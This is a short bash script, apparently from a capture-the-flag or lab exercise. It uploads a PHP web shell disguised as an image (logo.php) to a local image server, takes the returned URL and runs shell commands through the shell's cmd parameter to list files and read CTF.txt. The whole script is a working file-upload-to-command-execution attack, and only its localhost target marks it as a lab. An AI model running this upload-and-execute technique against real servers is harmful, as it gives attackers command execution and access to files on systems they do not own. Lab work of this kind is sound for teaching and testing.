#!/bin/bash

# This script demonstrates how to upload the web shell to the image server
# and then use it to attempt to read the CTF.txt file.

# 1. Upload the malicious file
echo "Uploading web shell..."
RESPONSE=$(curl -s -X POST -F "image=@logo.php" http://localhost:8081/upload.php)
echo "Server Response: $RESPONSE"

# 2. Extract the URL from the response (assuming JSON format {"url": "/images/..."})
# Using grep/sed for simple extraction without jq dependency
IMAGE_URL=$(echo "$RESPONSE" | sed 's/.*"url":"\([^"]*\)".*/\1/' | sed 's/\\\//\//g')

if [ -z "$IMAGE_URL" ]; then
    echo "Failed to get image URL. Upload might have failed."
    exit 1
fi

FULL_URL="http://localhost:8081${IMAGE_URL}"
echo "Web Shell uploaded to: $FULL_URL"

# 3. Execute command to read CTF.txt
# Note: In this specific docker setup, CTF.txt is in the backend container, 
# so reading it from the image-server container might fail unless they share a volume 
# or we are demonstrating the vulnerability principle.
# We will try to list the current directory and find any interesting files.

echo "Attempting to list files..."
curl -s "$FULL_URL?cmd=ls%20-la"

echo ""
echo "Attempting to read CTF.txt from web root..."
curl -s "${FULL_URL}?cmd=cat%20../CTF.txt"